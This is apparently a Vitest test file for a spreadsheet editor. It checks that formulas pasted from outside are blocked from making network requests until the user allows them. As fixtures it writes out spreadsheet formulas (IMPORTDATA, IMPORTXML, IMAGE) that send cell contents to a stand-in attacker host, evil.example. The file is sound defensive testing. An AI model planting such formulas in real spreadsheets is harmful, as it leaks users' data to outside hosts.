// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { editorView } from '../src/views/editor.js';
import { Doc } from '../src/lib/doc.js';
import { toDelimited } from '../src/core/tsv.js';
import { cellsToHtml } from '../src/core/clipboard.js';

// An HTML table copied from any web page can carry this app's own cell
// payload, formulas included. Pasted into a trusted spreadsheet, a formula
// such as IMPORTDATA("https://evil.example/?leak="&B1) fetched at once and
// sent the sheet's contents along. Such a paste now asks first, the way a
// file from elsewhere does.
function memoryStorage() {
  const m = new Map();
  return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k), clear: () => m.clear() };
}
Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true });

let view;
beforeEach(() => {
  localStorage.clear();
  vi.useFakeTimers();
  vi.stubGlobal('matchMedia', () => ({ matches: true, addEventListener() {}, removeEventListener() {} }));
  vi.stubGlobal('requestAnimationFrame', (fn) => setTimeout(fn, 0));
  vi.stubGlobal('cancelAnimationFrame', clearTimeout);
  Element.prototype.scrollIntoView = () => {};
  Element.prototype.scrollTo = () => {};
  Object.defineProperty(HTMLElement.prototype, 'clientWidth', { configurable: true, get: () => 800 });
  Object.defineProperty(HTMLElement.prototype, 'clientHeight', { configurable: true, get: () => 400 });
  vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockReturnValue({ measureText: (t) => ({ width: t.length * 7 }), font: '' });
  document.body.innerHTML = '<div id="app"></div>';
});
afterEach(() => { view?.destroy(); view = null; vi.clearAllTimers(); vi.useRealTimers(); vi.restoreAllMocks(); vi.unstubAllGlobals(); document.body.replaceChildren(); });

async function mount() {
  const doc = new Doc({ name: 'Mine', path: 'Spreadsheets/Mine.xlsx' });
  const wb = doc.wb;
  const id = wb.activeSheetId;
  wb.setInput(id, 0, 1, 'secret');
  view = editorView({ doc, goHome: vi.fn(), openPath: vi.fn(), newDoc: vi.fn(), templateDoc: vi.fn(), importFile: vi.fn() });
  document.querySelector('#app').append(view.el);
  // Stand in for the editor's own IMPORTDATA provider (Puter's fetch) once it is installed.
  const calls = [];
  wb.setAsyncProvider('IMPORTDATA', async (text) => { calls.push(text); return [['fetched']]; });
  await vi.advanceTimersByTimeAsync(1);
  const viewport = view.el.querySelector('.grid-viewport');
  viewport.focus();
  return { doc, wb, id, viewport, calls };
}
function paste(viewport, payload) {
  const e = new Event('paste', { bubbles: true, cancelable: true });
  Object.defineProperty(e, 'clipboardData', { value: { getData: (t) => payload[t] ?? '', files: [] } });
  viewport.dispatchEvent(e);
}
const notice = () => view.el.querySelector('.notice-bar');

it('blocks outside requests from formulas pasted as this app\'s HTML payload until allowed', async () => {
  const { wb, id, viewport, calls } = await mount();
  const html = cellsToHtml([['1']], [[{ v: null, f: 'IMPORTDATA("https://evil.example/?leak="&B1)' }]], null, null, { r: 0, c: 0 });
  paste(viewport, { 'text/html': html });
  expect(wb.getCell(id, 0, 0).f).toBe('IMPORTDATA("https://evil.example/?leak="&B1)');
  expect(wb.externalAllowed).toBe(false);
  expect(wb.getValue(id, 0, 0)).toEqual({ error: '#BLOCKED!' });
  await vi.advanceTimersByTimeAsync(20);
  expect(calls).toEqual([]);
  expect(notice().hidden).toBe(false);
  [...notice().querySelectorAll('button')].find((b) => b.textContent === 'Allow').click();
  expect(wb.externalAllowed).toBe(true);
  wb.getValue(id, 0, 0);
  await vi.advanceTimersByTimeAsync(20);
  expect(calls).toHaveLength(1);
});

it('asks for a web table whose text is a reaching formula, and for IMAGE with a web address', async () => {
  const { wb, id, viewport } = await mount();
  paste(viewport, { 'text/html': '<table><tr><td>=IMPORTXML("https://evil.example/x","//a")</td></tr></table>' });
  expect(wb.getCell(id, 0, 0).f).toBe('IMPORTXML("https://evil.example/x","//a")');
  expect(wb.externalAllowed).toBe(false);
  wb.setExternalAllowed(true);
  paste(viewport, { 'text/plain': '=IMAGE("https://evil.example/pixel.png?"&B1)' });
  expect(wb.externalAllowed).toBe(false);
});

it('leaves harmless pastes and the spreadsheet\'s own copies trusted', async () => {
  const { wb, id, viewport } = await mount();
  paste(viewport, { 'text/html': cellsToHtml([['4']], [[{ v: null, f: 'B1&"!"' }]], null, null, { r: 0, c: 0 }) });
  expect(wb.getValue(id, 0, 0)).toBe('secret!');
  paste(viewport, { 'text/html': cellsToHtml([['4']], [[{ v: null, f: 'IMAGE("data:image/png;base64,AAAA")' }]], null, null, { r: 0, c: 0 }) });
  paste(viewport, { 'text/plain': 'https://example.com is just text' });
  expect(wb.externalAllowed).toBe(true);
  expect(notice().hidden).toBe(true);
  // A formula typed here, then copied and pasted within the spreadsheet, is the user's own.
  wb.setInput(id, 2, 0, '=IMPORTDATA("https://example.com/a.csv")');
  view.goTo('Sheet1!A3');
  const copy = new Event('copy', { bubbles: true, cancelable: true });
  const data = {};
  Object.defineProperty(copy, 'clipboardData', { value: { setData: (t, v) => { data[t] = v; } } });
  viewport.dispatchEvent(copy);
  view.goTo('Sheet1!A5');
  paste(viewport, data);
  expect(wb.getCell(id, 4, 0).f).toBe('IMPORTDATA("https://example.com/a.csv")');
  expect(wb.externalAllowed).toBe(true);
});

it('keeps Office formula-like text literal without blocking unrelated workbook formulas', async () => {
  const { wb, id, viewport, calls } = await mount();
  const text='=IMPORTDATA("https://example.com/data")';
  paste(viewport,{'text/html':'<html xmlns:x="urn:schemas-microsoft-com:office:excel"><table><tr><td>###</td></tr></table></html>','text/plain':toDelimited([[text]])});
  expect(wb.getValue(id,0,0)).toBe(text);expect(wb.getCell(id,0,0).f).toBeNull();
  expect(wb.externalAllowed).toBe(true);expect(notice().hidden).toBe(true);
  await vi.advanceTimersByTimeAsync(20);expect(calls).toEqual([]);
});
it('blocks outside providers in pasted sparkline reference expressions before rendering',async()=>{
  const {wb,id,viewport,calls}=await mount();
  const formula='IF(IMPORTDATA("https://example.com/?value="&B1),B1:B2,B1:B2)';
  const nativeSparklines={rows:[0],cols:[0],sheetName:'Sheet1',groups:[{type:'line',sparklines:[{ref:'A1',formula}]}]};
  paste(viewport,{'text/html':cellsToHtml([['']],[[null]],null,[[null]],{r:0,c:0},{nativeSparklines})});
  expect(wb.externalAllowed).toBe(false);
  const {nativeSparklineData}=await import('../src/core/native-sparkline-data.js');
  expect(nativeSparklineData(wb,id,0,0).unavailable).toBe(true);
  await vi.advanceTimersByTimeAsync(20);expect(calls).toEqual([]);
});
